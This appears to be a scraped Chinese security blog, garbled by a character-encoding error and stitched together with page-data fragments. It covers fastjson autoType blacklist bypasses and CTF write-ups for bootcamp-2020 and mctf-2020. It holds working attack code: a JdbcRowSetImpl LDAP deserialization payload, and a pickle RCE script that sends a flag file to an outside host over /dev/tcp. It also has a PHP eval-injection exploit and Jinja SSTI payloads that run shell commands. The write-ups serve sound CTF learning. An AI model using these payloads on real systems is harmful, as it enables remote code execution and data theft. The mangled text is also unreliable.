1.2.24 ä¿®å¤ bypassç„¶åæ”¹ä¸‹mavené‡Œfastjsonä¾èµ–çœ‹çœ‹é«˜ä¸€ä¸ªç‰ˆæœ¬çš„fastjsoné˜²æŠ¤ã€‚å‘ç°å¤šäº†ä¸€ä¸ªcheckAutoTypeæ–¹æ³•ã€‚å½“ç„¶è¿™ä¸ªç‰ˆæœ¬åŒæ—¶éœ€è¦æ‰‹åŠ¨å¼€å¯autoType. 1234567891011121314151617if (this.autoTypeSupport || expectClass != null) &#123; int i; String deny; for(i = 0; i &lt; this.acceptList.length; ++i) &#123; deny = this.acceptList[i]; if (className.startsWith(deny)) &#123; return TypeUtils.loadClass(typeName, this.defaultClassLoader); &#125; &#125; for(i = 0; i &lt; this.denyList.length; ++i) &#123; deny = this.denyList[i]; if (className.startsWith(deny)) &#123; throw new JSONException(\"autoType is not support. \" + typeName); &#125; &#125;&#125; è¿™é‡Œåšäº†ä¸€æ¬¡ç™½åå•ä¸€æ¬¡é»‘åå•çš„æ£€æŸ¥ã€‚ä¼˜å…ˆè½½å…¥æ‰‹å·¥é…ç½®çš„ç™½åå•ç±»ï¼Œå¹¶å¯¹é»‘åå•ç±»çˆ†å‡ºå¼‚å¸¸ã€‚ç„¶ååé¢ç»§ç»­è°ƒç”¨æ—¶,å¦‚æœä¸ç¬¦åˆå‰é¢çš„æƒ…å†µï¼Œåé¢å°±ä¼šè¿›å…¥è¿™ä¸€æ®µ 1234567891011for(i = 0; i &lt; this.acceptList.length; ++i) &#123; accept = this.acceptList[i]; if (className.startsWith(accept)) &#123; clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader); if (expectClass != null &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123; throw new JSONException(\"type not match. \" + typeName + \" -&gt; \" + expectClass.getName()); &#125; return clazz; &#125;&#125; è·Ÿè¿›loadClass. 12345678910if (clazz != null) &#123; return clazz; &#125; else if (className.charAt(0) == '[') &#123; Class&lt;?&gt; componentType = loadClass(className.substring(1), classLoader); return Array.newInstance(componentType, 0).getClass(); &#125; else if (className.startsWith(\"L\") &amp;&amp; className.endsWith(\";\")) &#123; String newClassName = className.substring(1, className.length() - 1); return loadClass(newClassName, classLoader); &#125; else &#123; ...... åœ¨é»‘åå•æ£€æµ‹ä¹‹åï¼Œå½“å¼€å¤´æœ‰[æˆ–è€…å¼€å¤´æœ‰Lå’Œç»“å°¾æœ‰;æ—¶ä¼šå»æ‰è¿™äº›å­—ç¬¦ï¼Œä»è€Œé€ æˆäº†é»‘åå•çš„ç»•è¿‡ã€‚å› ä¸ºå®ƒæ˜¯ç”¨startswithæ£€æµ‹é»‘åå•çš„ã€‚ 1.2.42 bypassç„¶åä¸Šé¢é‚£ä¸ªbypassçš„ä¿®å¤ä¸»è¦æ˜¯ æŠŠé»‘åå•å…¨éƒ¨æ¢æˆhashé˜²æ­¢æ·±å…¥æ˜¯è¿™ä¸ªç‰ˆæœ¬çš„ç‰¹ç‚¹,åŒæ—¶ä¸Šé¢è¿™ä¸ªä»£ç çš„ä½œç”¨æ˜¯å¦‚æœæ»¡è¶³æŸä¸ªæ¡ä»¶çš„è¯å°±å»æ‰é‚£äº›Lxxx;çš„å‰åç¬¬ä¸€ä¸ªå­—ç¬¦ã€‚ç„¶è€Œä¿®å¤æ²»æ ‡ä¸æ²»æœ¬ï¼Œè¯´å®è¯æœ‰ç‚¹è ¢,è¿™é‡Œåªéœ€è¦LLxxx;;å°±èƒ½ç»•äº†ã€‚è€Œä¸”é»‘åå•hashä¹Ÿæœ‰dalao æµ‹è¿‡çš„ã€‚ä¹‹å‰çœ‹LandGreyä½¬æ”¶è—è¿‡ï¼Œhttps://github.com/LeadroyaL/fastjson-blacklist 1.2.47 bypass1.2.48ä»¥å‰çš„checkAutoTyyeæœ‰è¿™æ ·ä¸€æ®µä»£ç ã€‚ 123456789if (Arrays.binarySearch(this.denyHashCodes, hash) &gt;= 0 &amp;&amp; TypeUtils.getClassFromMapping(typeName) == null) &#123; throw new JSONException(\"autoType is not support. \" + typeName);&#125;......public static Class&lt;?&gt; getClassFromMapping(String className) &#123; return (Class)mappings.get(className);&#125; è¿™é‡Œå¾ˆå¥‡æ€ªçš„ifçš„æ¡ä»¶å¯¼è‡´ï¼šå³ä½¿å‰é¢æœåˆ°äº†é»‘åå•é‡Œçš„ç±»ï¼Œå¦‚æœmappingsé‡Œé¢å­˜åœ¨è¿™ä¸ªç±»,é‚£ä¹ˆä»å¯ä»¥è¿›è¡Œä¸‹ä¸€æ­¥æ“ä½œã€‚è¿™é‡Œçš„mappingsæ˜¯fastjsonææ—©è½½å…¥çš„ä¸€äº›ç¼“å­˜ç±» é‚£ä¹ˆå‡å¦‚å¯ä»¥å°†æ¶æ„ç±»åŠ å…¥mappingså°±èƒ½æœ‰ç»•è¿‡çš„æ•ˆæœäº†ã€‚ è¿™é‡Œæˆ‘ä»¬ç»§ç»­è·Ÿè¿› 1234567891011121314if (clazz == null) &#123; clazz = TypeUtils.getClassFromMapping(typeName);&#125;if (clazz == null) &#123; clazz = this.deserializers.findClass(typeName);&#125;if (clazz != null) &#123; if (expectClass != null &amp;&amp; clazz != HashMap.class &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123; throw new JSONException(\"type not match. \" + typeName + \" -&gt; \" + expectClass.getName()); &#125; else &#123; return clazz; &#125; é’ˆå¯¹deserializers.findClass,è¿™é‡Œç±»ä¸­æœ‰ä¸€ä¸ªåˆå§‹æ–¹æ³•ï¼Œåœ¨deserializersé‡Œé¢é¢„å…ˆå¡«å……äº†ä¸€äº›ç±»ä¸å…¶ååºåˆ—åŒ–å™¨çš„å®ä¾‹ã€‚ å…¶ä¸­åŒ…æ‹¬ä¸€ä¸ª 1this.deserializers.put(Class.class, MiscCodec.instance); é‡ç‚¹åœ¨ç»è¿‡autotypeæ£€æŸ¥åMiscCodecè¿™ä¸ªååºåˆ—åŒ–å™¨æ˜¯æ€ä¹ˆå¤„ç†Class.classçš„ã€‚ 123if (clazz == Class.class) &#123; return TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());&#125; è€ŒTypeUtils.loadClasséå¸¸å¥½ç”¨.ä»–å°†ä½¿ç”¨ClassLoader.loadClassæˆ–Class.forNameæ¥è½½å…¥ç±»ï¼Œåœ¨è¿™ä¸€è¿‡ç¨‹ä¸­ï¼Œæ¶‰åŠåˆ°äº†mappingsçš„æ“ä½œ,å³è°ƒç”¨äº†mappings.put(className,clazz).é‚£ä¹ˆè¿™æ ·çš„è¯ä¼šç›´æ¥å°†è½½å…¥åçš„å¯¹è±¡å¡«å…¥mappingsã€‚ é‚£ä¹ˆåªè¦æå‰å°†æ¶æ„ç±»è½½å…¥mappingså°±å¥½äº†ã€‚ 1json = \"&#123;&#123;\\\"@type\\\":\\\"java.lang.Class\\\",\\\"val\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\"&#125;,&#123;\\\"@type\\\": \\\"com.sun.rowset.JdbcRowSetImpl\\\",\\\"dataSourceName\\\": \\\"ldap://localhost:1389/Exploit\\\",\\\"autoCommit\\\": true&#125;&#125;\";","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.bycsec.top/tags/Java/"}]},{"title":"bootcamp-2020&&mctf-2020","slug":"bootcamp-2020&mctf-2020","date":"2020-10-05T08:52:33.000Z","updated":"2021-02-18T05:14:05.168Z","comments":true,"path":"2020/10/05/bootcamp-2020&mctf-2020/","link":"","permalink":"https://www.bycsec.top/2020/10/05/bootcamp-2020&mctf-2020/","excerpt":"","text":"å›½åº†æ”¾å‡ä¸€ç›´åœ¨åˆ·é¢˜,å¤§æ¦‚æ˜¯å› ä¸ºå›½èµ›è‡ªå·±æ‰“çš„å¤ªçƒ‚äº†å§â€¦..æ„Ÿè§‰æœ‰ä¸å°‘ä¸œè¥¿è¿˜æ˜¯å¯ä»¥ç²¾è¿›çš„ã€‚ ç„¶åå¤´å‡ å¤©æ€¼äº†ä¸‹htbçš„å‡ é“challenge.ä¸€ä¸ªåšäº†å¾ˆä¹…çš„é¢˜ç»ˆäºæ€¼å‡ºæ¥äº†,è¿˜æœ‰ä¸€é“æ–°é¢˜å¡ä½äº†,å¦ä¸€é“éš¾é¢˜ä»¥ä¸ºæœ‰äº†çªç ´ç»“æœå‘ç°æºç æ”¹äº†ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ä¸è¿‡æœ€åç»ˆäºæ€¼å‡ºæ¥äº†2333.äºæ˜¯è¿™ä¸¤å¤©å°±æ‰“äº†ä¸‹ctftimeä¸Šçš„ä¸¤ä¸ªctfæ”¾æ¾ä¸‹ã€‚ bootcamp-2020æ˜¯b01lersåŠçš„æ–°æ‰‹èµ›è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„,å°±æ˜¯luaé‚£é¢˜æˆ‘æ€ä¹ˆä¹Ÿæ²¡æƒ³åˆ°å®ƒwebsocketç«¯å£æ˜¯å¯¹å¤–çš„ã€‚å¦ä¸€ä¸ªm*ctf2020æŒºæœ‰æ„æ€ï¼Œéš¾åº¦æœ‰ç‚¹é«˜ã€‚è€Œä¸”å…¶ä¸­é™¤äº†webè¿™ä¸ªåˆ†ç±»è¿˜æœ‰ä¸“é—¨ä¸€ä¸ªååºåˆ—åŒ–åˆ†ç±»ï¼Œæ¯”è¾ƒæœ‰è¶£ã€‚ç›®å‰ä»–ä»¬éƒ½å·²ç»å¼€æ”¾ä»“åº“ï¼Œæ„Ÿå…´è¶£çš„ä¹Ÿå¯ä»¥å»çœ‹çœ‹ :)https://github.com/b01lers/bootcamp-2020 https://gitlab.com/mctf/quals-2020 bootcampCTF-2020åšé¢˜æ—¶ç®€å•åšçš„ç¬”è®°ã€‚æ‰€ä»¥æ²¡å›¾ã€‚å°†å°±çœ‹å§ Find That Data!æ•´ä½“ä¸Šæ˜¯ä¸ªé™æ€åŠŸèƒ½ã€‚é¦–å…ˆç™»é™†ç•Œé¢jsä¸­æç¤ºå­˜åœ¨/mazeè·¯ç”±ã€‚æ¥ä¸‹æ¥å‘ç°maze.jsä¸­å®šä¹‰ 1234567function check_data() &#123; if (x === 1 &amp;&amp; y === maxRows) &#123; $.post(\"/mem\", &#123; token: $(\"#token\").html() &#125;).done(function(data) &#123; alert(\"Memory: \" + data); &#125;); &#125;&#125; post/memä¼ é€’token=xxxå³å¯ã€‚tokené€šè¿‡è®¿é—®/tokenå³å¯è·å¾—ã€‚å¤§æ¦‚å‡ ç§’åˆ·æ–°ä¸€æ¬¡ã€‚ Programs Onlyå®è¯è¯´çœŸçš„è„‘æ´ã€‚è¦ä¸æ˜¯å› ä¸ºæƒ³èµ·æ¥å›½é™…èµ›ç»å¸¸æœ‰è¿™ç§pythonåç«¯æ”¾robots.txtçš„æ“ä½œæˆ‘çœŸæä¸å‡ºæ¥ã€‚ 12345User-agent: ProgramAllow: &#x2F;program&#x2F;User-agent: Master Control Program 0000Allow: &#x2F;program&#x2F;control æ”¹UAè®¿é—®åä¸€ä¸ªå³å¯ Reindeer Flotillaflagåœ¨åŠ äº†æ··æ·†çš„jsé‡Œ First Day Inspectionflagä¸€éƒ¨åˆ†åœ¨åŠ äº†æ··æ·†çš„jsé‡Œå‰©ä¸‹çš„å››å¤„æ‰¾æ‰¾å°±å®Œäº†ã€‚ EnFlaskComæœ‰ç‚¹æ„æ€ã€‚ç»™äº†ä¸¤ä¸ªcookie.ä¸€ä¸ªcookie useræ˜æ˜¾æ˜¯pickleåºåˆ—åŒ–æ•°æ®çš„16è¿›åˆ¶ã€‚ä¸è¿‡å¦ä¸€ä¸ªcookie signatureåªèƒ½çœ‹å‡ºæ˜¯256ä½ã€‚ä¸çŸ¥é“ç®—æ³•ã€‚ å­˜åœ¨æŠ¥é”™ï¼Œé‚£ä¹ˆå¯ä»¥ç®€å•å°è¯•æ›´æ¢cookieçˆ†å‡ºéƒ¨åˆ†æºç ã€‚ äºæ˜¯ç–¯ç‹‚fuzz.å¼€å§‹åªå•çº¯æ›´æ”¹cookieçš„æ•°å€¼è¯ï¼Œè§¦å‘æŠ¥é”™åªèƒ½å¾—åˆ°éƒ¨åˆ†è¯­å¥ã€‚å°±æ˜¯çŸ¥é“ä»–ä¼šè°ƒç”¨è‡ªå®šä¹‰çš„sign()å‡½æ•°è®¡ç®—userçš„ç­¾åå¹¶ä¸cookieä¸­çš„signatureè¿›è¡Œassertæ–­è¨€ã€‚é‚£ä¹ˆæ˜¾ç„¶éœ€è¦æŠ¥é”™å¸¦å‡ºsignè¿™ä¸ªå‡½æ•°çš„æºç ã€‚ æ˜¾ç„¶æˆ‘ä»¬åªæ˜¯æ›´æ”¹cookieçš„å€¼çš„è¯,ä¼ é€’ç»“æœæ€»æ˜¯å­—ç¬¦ä¸²ã€‚é‚£ä¹ˆsignå‡½æ•°æ˜¯ä¸ä¼šæŠ¥é”™çš„ï¼Œè‡ªç„¶å°±ä¸ä¼šçˆ†å‡ºæºç ã€‚æ•…å°†cookieæ”¹ä¸ºæ•°ç»„ä¼ é€’ä¸‹ã€‚å°±èƒ½å¾—åˆ°signæºç  123456789def sign(msg): if type(msg) is not bytes: msg = bytes(msg, 'utf8') keyPair = RSA.RsaKey(n=122929120347181180506630461162876206124588624246894159983930957362668455150316050033925361228333120570604695808166534050128069551994951866012400864449036793525176147906281580860150210721340627722872013368881325479371258844614688187593034753782177752358596565495566940343979199266441125486268112082163527793027, e=65537, d=51635782679667624816161506479122291839735385241628788060448957989505448336137988973540355929843726591511533462854760404030556214994476897684092607183504108409464544455089663435500260307179424851133578373222765508826806957647307627850137062790848710572525309996924372417099296184433521789646380579144711982601, p=9501029443969091845314200516854049131202897408079558348265027433645537138436529678958686186818098288199208700604454521018557526124774944873478107311624843, q=12938505355881421667086993319210059247524615565536125368076469169929690129440969655350679337213760041688434152508579599794889156578802099893924345843674089, u=3286573208962127166795043977112753146960511781843430267174815026644571470787675370042644248296438692308614275464993081581475202509588447127488505764805156) signer = pkcs1_15.new(keyPair) hsh = SHA384.new() hsh.update(msg) signature = signer.sign(hsh) return signature è¿›è€Œè°ƒç”¨pickle RCEå³å¯.æœ¬æ¥ä¸æƒ³rceçš„ç»“æœå‘ç°is_admin()è¿”å›Trueæ²¡æ”¹æˆã€‚å¹²è„†å°±ç›´æ¥rceäº†nc -lvkp 9001ç›‘å¬ç„¶åbash -c &quot; cat flag.txt &gt; /dev/tcp/ip/port&quot;å³å¯ã€‚é¿å…å¼¹shellé€ æˆå¹²æ‰°ã€‚ 12345678910111213141516171819202122232425262728import requestsfrom Crypto.Signature import pkcs1_15from Crypto.Hash import SHA384from Crypto.PublicKey import RSAimport binasciiimport pickleimport osdef sign(msg): if type(msg) is not bytes: msg = bytes(msg, 'utf8') keyPair = RSA.RsaKey(n=122929120347181180506630461162876206124588624246894159983930957362668455150316050033925361228333120570604695808166534050128069551994951866012400864449036793525176147906281580860150210721340627722872013368881325479371258844614688187593034753782177752358596565495566940343979199266441125486268112082163527793027, e=65537, d=51635782679667624816161506479122291839735385241628788060448957989505448336137988973540355929843726591511533462854760404030556214994476897684092607183504108409464544455089663435500260307179424851133578373222765508826806957647307627850137062790848710572525309996924372417099296184433521789646380579144711982601, p=9501029443969091845314200516854049131202897408079558348265027433645537138436529678958686186818098288199208700604454521018557526124774944873478107311624843, q=12938505355881421667086993319210059247524615565536125368076469169929690129440969655350679337213760041688434152508579599794889156578802099893924345843674089, u=3286573208962127166795043977112753146960511781843430267174815026644571470787675370042644248296438692308614275464993081581475202509588447127488505764805156) signer = pkcs1_15.new(keyPair) hsh = SHA384.new() hsh.update(msg) signature = signer.sign(hsh) return signatureclass exp(object): def __reduce__(self): s = \"\"\"bash -c \"cat flag.txt &gt; /dev/tcp/xxx/9001\" \"\"\" return (os.system, (s,))e = exp()user=binascii.hexlify(pickle.dumps(e)).decode()signature=binascii.hexlify(sign(user)).decode()r = requests.get('http://chal.ctf.b01lers.com:3000/flag',cookies=&#123;'user':user,'signature':signature&#125;) ç«¯å£å³å¯æ‹¿åˆ°flag Whereâ€™s Tron?ç»™äº†æºç å¯ä»¥ä»»æ„sql selectè¯­å¥æ‰§è¡Œã€‚å®ƒå”¯ä¸€çš„é™åˆ¶å°±æ˜¯limit 20æ‰€ä»¥ç›´æ¥æ³¨é‡Šæ‰ã€‚åœ¨è¿”å›çš„å‡ åƒæ¡æ•°æ®ä¸­ç›´æ¥æ‰¾tronã€‚å®ƒçš„æŸä¸€ä¸ªåˆ—ä¸­å°±æ˜¯flag 1select * from programs where name regexp \"^Tron\"# Next Gen Networkingç»™äº†æºç ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970&lt;?php function get_data() &#123; if(!isset($_POST[\"packet\"]))&#123; return \"&lt;p&gt;Error: packet not found&lt;/p&gt;\"; &#125; $raw_packet = $_POST[\"packet\"]; $packet = json_decode($raw_packet); if($packet == null) &#123; return \"&lt;p&gt;Error: decoding packet&lt;/p&gt;\"; &#125; if($packet-&gt;version != 6.5) &#123; return \"&lt;p&gt;Error: wrong packet version&lt;/p&gt;\"; &#125; $calculated_ihl = strlen($packet-&gt;version) + strlen(strval($packet-&gt;len)) + strlen(strval($packet-&gt;ttl)) + strlen(strval($packet-&gt;seqno)) + strlen(strval($packet-&gt;ackno)) + strlen($packet-&gt;algo) + 64; $calculated_ihl = $calculated_ihl + strlen(strval($calculated_ihl)); if($packet-&gt;ihl != $calculated_ihl or $packet-&gt;ihl &gt; 170) &#123; return \"&lt;p&gt;Error: wrong header size&lt;/p&gt;\"; &#125; if($packet-&gt;len != strlen($raw_packet)) &#123; return \"&lt;p&gt;Error: mismatched packet size&lt;/p&gt;\"; &#125; if($packet-&gt;ttl - 1 != 0) &#123; return \"&lt;p&gt;Error: invalid ttl&lt;/p&gt;\"; &#125; if($packet-&gt;ackno != $_COOKIE[\"seqno\"] + 1) &#123; return \"&lt;p&gt;Error: out of order packet&lt;/p&gt;\"; &#125; if($packet-&gt;algo != \"sha256\")&#123; return \"&lt;p&gt;Error: unsupported algorithm&lt;/p&gt;\"; &#125; $checksum_str = \"\\$checksum = hash(\\\"$packet-&gt;algo\\\", strval($packet-&gt;ihl + $packet-&gt;len + $packet-&gt;ttl + $packet-&gt;seqno + $packet-&gt;ackno));\"; eval($checksum_str); if($packet-&gt;checksum != $checksum) &#123; return \"&lt;p&gt;Error: checksums don't match&lt;/p&gt;\"; &#125; $file_name_hash = hash(\"md5\", microtime()); $file_name = \"sent/\".$file_name_hash.\".packet\"; $packet_file = fopen($file_name, \"w\") or die(\"Unable to open packet file\"); fwrite($packet_file, $packet-&gt;data); fclose($packet_file); return \"&lt;h1&gt;Packet data written&lt;/h1&gt;&lt;div&gt;&lt;a href=\\\"\".$file_name.\"\\\"&gt;\".$file_name_hash.\".packet&lt;/a&gt;&lt;/div&gt;\"; &#125;?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;Send Packet.&lt;/title&gt; &lt;link rel=\"stylesheet\" href=\"/style.css\"/&gt; &lt;link rel=\"stylesheet\" href=\"/tron.css\"/&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"main-wrapper\"&gt; &lt;div class=\"content-page\"&gt; &lt;?php echo get_data(); ?&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; ä¸»è¦å°±æ˜¯ä¸€ä¸ªevalå¯ä»¥åˆ©ç”¨ã€‚ç„¶åç”¨å¼±ç±»å‹ç»•è¿‡å±æ€§çš„è¦æ±‚rceå¦‚ä¸‹: 1));?&gt;&lt;?php system(&quot;cat ./sent/flag.packet.php&quot;); -1 = 0æˆç«‹ã€‚poc1234567891011121314&lt;?php$raw_packet = '&#123;\"version\":6.5,\"len\":110&#125;';$packet=json_decode($raw_packet,true);$packet[\"version\"] = 6.5;$packet[\"ttl\"]=\"1));?&gt;&lt;?php system('cat /var/www/tron-eval/packets/sent/flag.packet.php');//\";$packet[\"seqno\"]=0;$packet[\"ackno\"]=1;$packet[\"algo\"]=\"sha256\";$calculated_ihl = strlen($packet[\"version\"]) + strlen(strval($packet[\"len\"])) + strlen(strval($packet[\"ttl\"])) + strlen(strval($packet[\"seqno\"])) + strlen(strval($packet[\"ackno\"])) + strlen($packet[\"algo\"]) + 64;$calculated_ihl = $calculated_ihl + strlen(strval($calculated_ihl));$packet[\"ihl\"]=$calculated_ihl;$packet[\"len\"]=strlen(json_encode($packet));var_dump(json_encode($packet)); exp123456import requestsurl='http://chal.ctf.b01lers.com:3002/packets/send.php'payload=\"\"\"&#123;\"version\":6.5,\"len\":164,\"ttl\":\"1));?&gt;&lt;?php system('cat \\/var\\/www\\/tron-eval\\/packets\\/sent\\/flag.packet.php');\\/\\/\",\"seqno\":0,\"ackno\":1,\"algo\":\"sha256\",\"ihl\":157&#125;\"\"\"r=requests.post(url,data=&#123;'packet':payload&#125;)print(r.text) Derezzyæœ‰ç‚¹å¯æƒœã€‚å…¶å®ç¡®å®ä¸éš¾çš„ã€‚ä¸»è¦è¿˜æ˜¯æ²¡æƒ³åˆ°å®ƒçš„websocketç«¯å£æ˜¯å¯¹å¤–çš„,æœ‰äº›éƒé—·ã€‚ é¦–å…ˆé¢˜ç›®æ•´ä½“ä¸Šä¼¼ä¹æ˜¯ä¸€ä¸ªæ’­æ”¾åŠŸèƒ½ã€‚ç„¶åå¯ç”¨çš„å†…å®¹ä¸å¤šã€‚åªæœ‰ä¸€ä¸ªmain.js,ç”¨js-beautifyerç¾åŒ–ä¸‹åçœ‹çœ‹å…¶ä¸­çš„å…³é”®ä»£ç ã€‚ 12345678function updateServer() &#123; $.post(\"update\", &#123; request: \"listen\", path: \"# wait where were my non-dynamic files..../app.lua\" &#125;, function(a, b) &#123; \"success\" == b ? console.log(\"successful update\") : console.log(\"unsuccessful update\") &#125;)&#125; å¾—çŸ¥äº†updateè·¯ç”±ä¸ä¼ é€’çš„æŸä¸ªå‚æ•°pathæç¤ºæˆ‘ä»¬æœ‰app.lua.å› ä¸ºæ˜¯non-dynamicæ‰€ä»¥å°±æ˜¯staticé™æ€äº†ã€‚staticä¸‹æœ‰ä¸€ä¸ªfilesæ–‡ä»¶å¤¹ã€‚å¯ä»¥åœ¨é‡Œé¢æ‰¾åˆ°app.lua. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283[&#123; update = \"/update\" &#125;] = respond_to(&#123; GET = function(self) return &#123; render = true &#125; end, POST = function(self) if self.POST.request == 'listen' then if not (self.session.id) then do local listener = Listens:find(csrf.generate_token(self)) if listener then self.session.id = listener.id else listener = Listens:create(&#123; id = csrf.generate_token(self), count = 0 &#125;) self.session.id = listener.id end end end if self.session.id and not Listens:find(self.session.id) then local listener = Listens:create(&#123; id = csrf.generate_token(self), count = 0 &#125;) self.session.id = listener.id end local listener = Listens:find(self.session.id) local data = \"flag&#123;........&#125;\" if listener.count &gt;= 3470 then local ws = w.new_from_uri(\"ws://localhost:8181\") assert(ws:connect()) data = &#123; user = self.session.id, count = listener.count &#125; assert(ws:send(cjson.encode(data))) data = cjson.decode(assert(ws:receive())) assert(ws:close()) end local utct do local _accum_0 = &#123; &#125; local _len_0 = 1 for item in string.gmatch(listener.updated_at, \"%d+\") do _accum_0[_len_0] = item _len_0 = _len_0 + 1 end utct = _accum_0 end local updatetime = os.time(&#123; year = utct[1], month = utct[2], day = utct[3], hour = utct[4], min = utct[5], sec = utct[6] &#125;) if listener ~= nil and os.time() - updatetime &gt;= 104 then listener.count = listener.count + 1 listener:update(\"count\") end return &#123; json = &#123; status = \"success\", id = self.session.id, timestamp = listener.updated_at, count = listener.count, updatetime = updatetime, currenttime = os.time(), flag = data &#125; &#125; end return &#123; redirect_to = \"/\" &#125; end &#125;) è¿™é‡Œå•ç‹¬çœ‹ä¸‹updateè·¯ç”±çš„è§„åˆ™ã€‚ä¸éš¾å‘ç°åªæœ‰count&gt;=3470æ—¶ä¼šä¸websocketé€šä¿¡ã€‚æ­¤æ—¶æœåŠ¡ç«¯ä¼šè¿”å›ä¸€äº›å†…å®¹ã€‚å…¶ä¸­åº”è¯¥å°±æ˜¯çœŸæ­£çš„flagäº†ã€‚ 1234567891011if listener.count &gt;= 3470 then local ws = w.new_from_uri(\"ws://localhost:8181\") assert(ws:connect()) data = &#123; user = self.session.id, count = listener.count &#125; assert(ws:send(cjson.encode(data))) data = cjson.decode(assert(ws:receive())) assert(ws:close())end ç„¶åå°±æ²¡æœ‰ç„¶åäº†ã€‚ã€‚ã€‚æˆ‘ä»¥ä¸ºä¸å¯èƒ½è®©é€‰æ‰‹è·Ÿwebsocketé€šä¿¡å°±è·‘å»çœ‹luaæœ‰æ²¡æœ‰ä»€ä¹ˆå…¶ä»–æ–¹æ³•ä¿®æ”¹æ—¶é—´å‚æ•°ã€‚ç»“æœå°±æ‰è¿›äº†rabbithole.çŸ¥é“èƒ½é€šä¿¡çš„è¯ï¼Œè§£å†³æ–¹æ³•å°±å¾ˆç®€å•äº†å› ä¸ºæœ‰æºç æ‰€ä»¥åœ¨è‡ªå·±æœåŠ¡å™¨æ­å»ºäº†å¤ç°ä¸‹ã€‚è¿™ä¸ªé¢˜è¿˜æœ‰éå¸¸è„‘æ´çš„åœ°æ–¹ã€‚å®ƒè¿”å›çš„ç»“æœæ˜¯ç”¨flagä¸ä½ çš„åå­—è¿›è¡Œå¼‚æˆ–ã€‚æ‰€ä»¥æˆ‘ä»¬ä¼ é€’è¶³å¤Ÿé•¿çš„åå­—å¹¶ä¸”ä¸ä¹‹å¼‚æˆ–è¿˜åŸflag.å®˜æ–¹è„šæœ¬ 123456789101112131415import asyncioimport websocketsimport jsonasync def solve(): uri = \"ws://xxx:8181\" async with websockets.connect(uri) as websocket: name = \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" data = &#123;\"user\": name, \"count\": 3500&#125; await websocket.send(json.dumps(data)) resp = await websocket.recv() for r in resp: print(chr(ord(r) ^ ord('A')), end=\"\")asyncio.get_event_loop().run_until_complete(solve()) webé¢˜ç›®å°±è¿™ä¹ˆå¤šã€‚æ•´ä½“ä¸Šæ¯”è¾ƒç®€å•ã€‚æœ€åä¸€ä¸ªæœ‰ç‚¹è„‘æ´.ä¸è¿‡é¡ºå¸¦ç€çœ‹äº†ä¸‹luaæ„Ÿè§‰è¿˜æ˜¯è›®æœ‰æ„æ€çš„ã€‚å†™webåº”ç”¨çš„æ€è·¯æœ‰ç‚¹æ¥è¿‘nodejs. m*ctf2020è¿™ä¸ªæ¯”èµ›å»çœ‹æ—¶å·²ç»åªå‰©2å°æ—¶äº†ã€‚ç„¶åtgç¾¤é‡Œå…¨æ˜¯æ¯›å­ï¼Œçœ‹ä¸æ‡‚è®²ä»€ä¹ˆâ€¦â€¦åªèƒ½çœ‹çœ‹gitlabä¸Šä¸€äº›é¢˜ç›®çš„æ€è·¯äº†ã€‚é¢˜ç›®è´¨é‡ä¸é”™ç„¶åè«åçš„å¾ˆå¯¹èƒƒå£ã€‚å°±æ˜¯æ—¶é—´å¤ªç´§åŠ ä¸Štcléƒ½æ²¡åšå‡ºæ¥2333.æœ‰ä¸€ä¸ªä¸“é—¨çš„åºåˆ—åŒ–åˆ†ç±»ã€‚éå¸¸æœ‰æ„æ€ã€‚ Web-wikié¢˜ç›®å¼€å§‹åªèƒ½æ˜ç¡®çš„æ˜¯xffä¼¼ä¹ä¼šåœ¨é¦–é¡µæ¸²æŸ“ï¼ŒåŠ ä¸Šæ˜¯pythonä¸éš¾æƒ³åˆ°ssti.ä½†æ˜¯æ›´æ”¹xffè®¿é—®ä¼šå‘ç°æˆ‘ä»¬å¹¶ä¸èƒ½æ§åˆ¶æ¸²æŸ“çš„å†…å®¹ã€‚é‚£ä¹ˆè¯´æ˜å¯èƒ½éœ€è¦æºç äº†ã€‚å­˜åœ¨ä¸€ä¸ªè·¯å¾„ç©¿è¶Šè·å–æºç ã€‚å…¶å®è¿™ä¹Ÿç®—pythonæ¯”è¾ƒç»å…¸çš„æ¼æ´äº†ã€‚ 123456789101112131415161718@app.route('/index/&lt;path:dir&gt;')def getfile(dir): check_dir = Disabled(str(dir)) xff = str(request.headers.getlist('X-Forwarded-For')[0]).split(',')[1] check_xff = Disabled(xff) if (check_xff.abort_rq()): xff = str(request.headers.getlist('X-Forwarded-For')[0]).split(',')[len(xff)-1] if not (check_dir.check_blocked()): try: with open(os.path.join('/app/static', dir), 'r') as file: data = file.read() file.close() return data except FileNotFoundError: pass except PermissionError: pass return render_template_string(my_template(xff.replace('.', ''))) å¯ä»¥çœ‹åˆ°ç¡®å®å¯ä»¥xffè¾¾æˆssti.ä¸è¿‡éœ€è¦å–,åçš„å†…å®¹ä¸ºå¯æ§ç‚¹ã€‚ç„¶åä¸èƒ½åŒ…å«.é‚£å°±å¾ˆç®€å•äº†ã€‚ç”¨atträ¸€æ¡ç»§æ‰¿é“¾æˆ–è€…ç›´æ¥ 1&#123;&#123;request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('env')['read']()&#125;&#125; 12345678url='http://web-library.mctf.online/index/'proxies=&#123;'http':'127.0.0.1:1080','https':'127.0.0.1:1080'&#125;payload=\"\"\"&#123;&#123;request['application']['__globals__']['__builtins__']['__import__']('os')[\"popen\"](\"env\")[\"read\"]()&#125;&#125;\"\"\"headers=&#123; 'X-Forwarded-For':'123 ,'+payload&#125;r=requests.get(url,headers=headers,proxies=proxies)print(r.text) FLAG=MCTF{IS_IT_NOT_SO_SECURE_?} DeadJournalåºåˆ—åŒ–åˆ†ç±»çš„pythonåºåˆ—åŒ– 